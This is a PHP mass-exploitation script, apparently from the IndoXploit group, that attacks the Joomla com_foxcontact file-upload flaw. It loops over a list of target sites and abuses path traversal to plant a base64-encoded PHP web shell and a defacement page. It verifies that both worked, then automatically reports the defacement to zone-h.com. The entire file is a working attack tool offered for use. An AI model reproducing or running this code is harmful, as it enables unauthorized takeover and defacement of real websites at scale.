<?php
/**

Joomla Component com_foxcontact Arbitrary File Upload
https://cxsecurity.com/issue/WLB-2016050072

Auto Exploiter (Shell Upload, Auto Deface, and Auto Submit Zone -H)
Coded by: L0c4lh34rtz - IndoXploit
http://www.indoxploit.or.id/2017/12/joomla-component-comfoxcontact.html

*/

error_reporting(0);
set_time_limit(0);

Class IDX_Foxcontact {
	public  $url;
	private $file = [];

	/* Nick Hacker Kalian / Nick Zone -H Kalian */
	/* Pastikan dalam script deface kalian terdapat kata HACKED */
	private $hacker = "Red-z1";

	/* script uploader, sebaiknya jangan di otak-atik */
	private $uploader  = 'R0lGODlhOw0KPGh0bWw+DQo8dGl0bGU+VXBsb2FkZXIgQnkgSW5kb1hwbG9pdCBCT1Q8L3RpdGxlPg0KPHA+PD9waHAgZWNobyAnPGI+Jy5waHBfdW5hbWUoKS4nPC9iPic7ID8+PGJyPg0KPD9waHAgZWNobyAnPGI+Jy5nZXRjd2QoKS4nPC9iPic7ID8+PC9wPg0KPGZvcm0gbWV0aG9kPSdwb3N0JyBlbmN0eXBlPSdtdWx0aXBhcnQvZm9ybS1kYXRhJz4NCjxpbnB1dCB0eXBlPSdmaWxlJyBuYW1lPSdpZHhfZmlsZSc+DQo8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXBsb2FkJyBuYW1lPSd1cGxvYWQnPg0KPC9mb3JtPg0KPD9waHAgaWYoaXNzZXQoJF9QT1NUWyd1cGxvYWQnXSkpIHsgaWYoQGNvcHkoJF9GSUxFU1snaWR4X2ZpbGUnXVsndG1wX25hbWUnXSwgJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddKSkgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPk9LPC9iPl0nOyB9IGVsc2UgeyBlY2hvJF9GSUxFU1snaWR4X2ZpbGUnXVsnbmFtZSddLiAnWzxiPkZBSUxFRDwvYj4nOyB9IH0gPz4=';
		
	/* script deface, ubah bagian ini ke base64 script deface kalian */
	private $deface    = 'PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkhhY2tlZCDCuyBDaWxhY2FwIEJsYWNraGF0PC90aXRsZT4KPG1ldGEgY2hhcnNldD0idXRmLTgiIC8+CjxtZXRhIG5hbWU9ImtleXdvcmRzIiBjb250ZW50PSJDaWxhY2FwIEJsYWNraGF0IiAvPgo8bWV0YSBuYW1lPSJkZXNjcmlwdGlvbiIgY29udGVudD0iT3JhIE5nYXBhayBPcmEgS2VwZW5hayIgLz4KPGxpbmsgcmVsPSJpY29uIiBocmVmPSJodHRwczovL2cudG9wNHRvcC5pby9wXzE0OTZkc3JiNjAuanBnIiB0eXBlPSJpbWFnZS9qcGciPgo8bGluayBocmVmPSJodHRwczovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9S2VsbHkrU2xhYiIgcmVsPSJzdHlsZXNoZWV0IiB0eXBlPSJ0ZXh0L2NzcyI+CjwvaGVhZD4KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4KYm9keSB7CiAgIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KaDEgewogICBmb250LWZhbWlseTogS2VsbHkgU2xhYjsKICAgZm9udC1zaXplOiA3MHB4OwogICBjb2xvcjogIzAwMDAwMDsKICAgdGV4dC1hbGlnbjogY2VudGVyOwp9CmgyIHsKICAgZm9udC1mYW1pbHk6IEtlbGx5IFNsYWI7CiAgIGZvbnQtc2l6ZTogNDBweDsKICAgY29sb3I6ICMwMDAwMDA7CiAgIHRleHQtYWxpZ246IGNlbnRlcjsKfQpoMyB7CiAgIGZvbnQtZmFtaWx5OiBLZWxseSBTbGFiOwogICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgIGNvbG9yOiAjMDAwMDAwOwogICBmb250LXNpemU6IDMwcHg7Cn0KPC9zdHlsZT4KPGJvZHk+CjxzY3JpcHQgdHlwZT0idGV4dC9qYXZhc2NyaXB0Ij4Kd2luZG93LmFsZXJ0ICgiTXVzYWggQ2FuZ2tlbWFuICEiKTsKPC9zY3JpcHQ+CjxjZW50ZXI+CjxpbWcgc3JjPSJodHRwczovL2EudG9wNHRvcC5pby9wXzE0OTZiZHpkaTAucG5nIiBhbHQ9IkNpbGFjYXAgQmxhY2toYXQiIHdpZHRoPSI4MDBweCIgaGVpZ2h0PSI4MDBweCI+CjxoMT5IYWNrZWQgQnkgU2VnYXdvbiBGdCBDb2NvdGU8L2gxPgo8aDI+fiBPcmEgTmdhcGFrIE9yYSBLZXBlbmFrIH48L2gyPjxicj48YnI+PGJyPjxicj48YnI+CjxoMz48aT7CqUNpbGFjYXBCbGFja2hhdDwvaDM+CjwvYm9keT4KPC9odG1sPg==';

		 

	public function __construct() {
		$this->file = (object) $this->file;

		/* Nama file deface kalian */
		$this->file->deface 	= "c.htm";

		$this->file->shell 		= $this->randomFileName().".php";
	}

	public function validUrl() {
		if(!preg_match("/^http:\/\//", $this->url) AND !preg_match("/^https:\/\//", $this->url)) {
			$url = "http://".$this->url;
			return $url;
		} else {
			return $this->url;
		}
	}

	public function randomFileName() {
		$characters = implode("", range(0,9)).implode("", range("A","Z")).implode("", range("a","z"));
		$generate   = substr(str_shuffle($characters), 0, rand(4, 8));

		$prefixFilename = "\x69\x6e\x64\x6f\x78\x70\x6c\x6f\x69\x74"."_";
		return $prefixFilename.$generate;
	}

	public function curl($url, $data = null, $headers = null, $cookie = true) {
		$ch = curl_init();
			  curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
			  curl_setopt($ch, CURLOPT_URL, $url);
			  curl_setopt($ch, CURLOPT_USERAGENT, "IndoXploitTools/1.1");
			  //curl_setopt($ch, CURLOPT_VERBOSE, TRUE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
			  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
			  curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
			  curl_setopt($ch, CURLOPT_TIMEOUT, 5);

		if($data !== null) {
			  curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
			  curl_setopt($ch, CURLOPT_POST, TRUE);
			  curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
		}

		if($headers !== null) {
			  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
		}

		if($cookie === true) {
			  curl_setopt($ch, CURLOPT_COOKIE, TRUE);
			  curl_setopt($ch, CURLOPT_COOKIEFILE, "cookie.txt");
			  curl_setopt($ch, CURLOPT_COOKIEJAR, "cookie.txt");
		}

		$exec = curl_exec($ch);
		$info = curl_getinfo($ch);

			  curl_close($ch);

		return (object) [
			"response" 	=> $exec,
			"info"		=> $info
		];

	}

	public function getId() {
		$url 		= $this->url;
		$getContent = $this->curl($url)->response;
		preg_match_all("/<a name=\"cid_(.*?)\">/", $getContent, $cid);
		preg_match_all("/<a name=\"mid_(.*?)\">/", $getContent, $mid);

		return (object) [
			"cid" => ($cid[1][0] === NULL ? 0 : $cid[1][0]),
			"mid" => ($mid[1][0] === NULL ? 0 : $mid[1][0]),
		];
	}

	public function exploit() {
		$getCid = $this->getId()->cid;
		$getMid = $this->getId()->mid;

		$url	= (object) parse_url($this->url);

		$headers = [
			"X-Requested-With: XMLHttpRequest",
			"X-File-Name: ".$this->file->shell,
			"Content-Type: image/jpeg"
		];

		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../".$this->file->shell,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->uploader), $headers);
		}

		$shell = $url->scheme."://".$url->host."/components/com_foxcontact/".$this->file->shell;
		$check = $this->curl($shell)->response;
		if(preg_match("/Uploader By IndoXploit BOT/i", $check)) {
			print "[+] Shell OK: ".$shell."\n";
			$this->save($shell);
		} else {
			print "[-] Shell Failed\n";
		}
		
		$vuln 	= [
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/file-uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=component&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/index.php?option=com_foxcontact&view=loader&type=uploader&owner=module&id=".$getCid."?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
			$url->scheme."://".$url->host."/components/com_foxcontact/lib/uploader.php?cid=".$getCid."&mid=".$getMid."&qqfile=/../../../../".$this->file->deface,
		];

		foreach($vuln as $v) {
			$this->curl($v, base64_decode($this->deface), $headers);
		}

		$deface = $url->scheme."://".$url->host."/".$this->file->deface;
		$check = $this->curl($deface)->response;
		if(preg_match("/hacked/i", $check)) {
			print "[+] Deface OK: ".$deface."\n";
			$this->zoneh($deface);
			$this->save($deface);
		} else {
			print "[-] Deface Failed\n";
		}
	}

	public function zoneh($url) {
		$post = $this->curl("http://www.zone-h.com/notify/single", "defacer=".$this->hacker."&domain1=$url&hackmode=1&reason=1&submit=Send",null,false);
		if(preg_match("/color=\"red\">(.*?)<\/font><\/li>/i", $post->response, $matches)) {
			if($matches[1] === "ERROR") {
				preg_match("/<font color=\"red\">ERROR:<br\/>(.*?)<br\/>/i", $post->response, $matches2);
				print "[-] Zone-H ($url) [ERROR: ".$matches2[1]."]\n\n";
			} else {
				print "[+] Zone-H ($url) [OK]\n\n";
			}
		}
	}

	public function save($isi) {
		$handle = fopen("result_foxcontact.txt", "a+");
		fwrite($handle, "$isi\n");
		fclose($handle);
	}
} 	

if(!isset($argv[1])) die("!! Usage: php ".$argv[0]." target.txt");
if(!file_exists($argv[1])) die("!! File target ".$argv[1]." tidak di temukan!!");
$open = explode("\n", file_get_contents($argv[1]));

foreach($open as $list) {
	$fox = new IDX_Foxcontact();
	$fox->url = trim($list);
	$fox->url = $fox->validUrl();

	print "[*] Exploiting ".parse_url($fox->url, PHP_URL_HOST)."\n";
	$fox->exploit();
}